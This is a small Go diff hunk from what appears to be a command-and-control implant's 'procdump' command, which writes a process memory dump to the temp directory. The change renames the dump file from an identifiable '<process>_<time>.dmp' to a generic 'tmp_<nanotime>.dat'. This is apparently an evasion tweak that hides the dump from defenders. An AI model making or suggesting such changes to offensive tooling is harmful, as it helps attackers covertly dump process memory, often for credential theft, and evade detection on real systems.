@@ -130,7 +130,7 @@ func (c *ProcdumpCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Create temp file for the dump
 	tempDir := os.TempDir()
-	dumpFileName := fmt.Sprintf("%s_%d.dmp", strings.TrimSuffix(processName, ".exe"), time.Now().Unix())
+	dumpFileName := fmt.Sprintf("tmp_%d.dat", time.Now().UnixNano())
 	dumpPath := filepath.Join(tempDir, dumpFileName)
 
 	dumpFile, err := os.Create(dumpPath)
